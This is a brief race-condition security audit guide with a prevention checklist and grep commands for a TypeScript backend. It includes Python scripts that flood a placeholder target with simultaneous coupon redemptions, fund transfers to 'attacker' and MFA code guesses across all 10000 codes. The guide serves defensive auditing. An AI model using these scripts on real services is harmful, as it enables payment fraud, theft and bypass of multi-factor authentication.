# Race Condition Audit

Based on MITRE ATT&CK T1190 and OWASP Top 10 A04:2021.

## When to Use

- After adding transaction-based functionality (payments, transfers, coupons)
- When testing rate-limiting or attempt-limiting mechanisms
- During security audits of game economy features

## Attacks to Test

### 1. Limit Overrun (Coupon/Item Redemption)

```python
# Using Turbo Intruder single-packet attack
# Send 20 simultaneous coupon redemption requests
import threading
import requests

barrier = threading.Barrier(20)

def redeem():
    barrier.wait()
    r = requests.post("https://target/api/redeem",
        json={"coupon": "DISCOUNT50"},
        headers={"Cookie": "session=abc123"})
    print(f"Status: {r.status_code}")

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

### 2. Balance Overdraft

```python
# Send simultaneous transfer requests
barrier = threading.Barrier(10)

def transfer():
    barrier.wait()
    r = requests.post("https://target/api/transfer",
        json={"to": "attacker", "amount": 100},
        headers={"Cookie": "session=abc123"})
```

### 3. MFA Bypass

```python
# Submit multiple MFA codes simultaneously
barrier = threading.Barrier(20)

def try_code(code):
    barrier.wait()
    r = requests.post("https://target/api/verify-mfa",
        json={"code": code})

# Try all 10000 possible codes simultaneously
codes = [f"{i:04d}" for i in range(10000)]
```

## Checklist

### Prevention

- [ ] Database-level locking (`SELECT FOR UPDATE`) on critical operations
- [ ] Idempotency keys for state-changing requests
- [ ] Optimistic concurrency control with version numbers
- [ ] Distributed locks for multi-server environments
- [ ] Single-use tokens (coupons, invites) marked atomically

### High-Risk Areas

- [ ] Payment/transfer endpoints
- [ ] Coupon/discount redemption
- [ ] Inventory purchase (limited stock)
- [ ] Rate-limited operations (login, OTP)
- [ ] Multi-step workflows (email change, password reset)
- [ ] Game economy transactions (currency, items)

## Quick Scan

```bash
# Check for transaction handling
grep -rn "transaction\|\.lock\|FOR UPDATE\|atomic" apps/be/src/ --include="*.ts"

# Check for idempotency
grep -rn "idempoten\|idempotency" apps/be/src/ --include="*.ts"

# Check for balance/inventory operations
grep -rn "balance\|inventory\|stock\|quantity" apps/be/src/ --include="*.ts" | head -10
```

## References

- Source: Anthropic-Cybersecurity-Skills `exploiting-race-condition-vulnerabilities`
- PortSwigger: https://portswigger.net/web-security/race-conditions
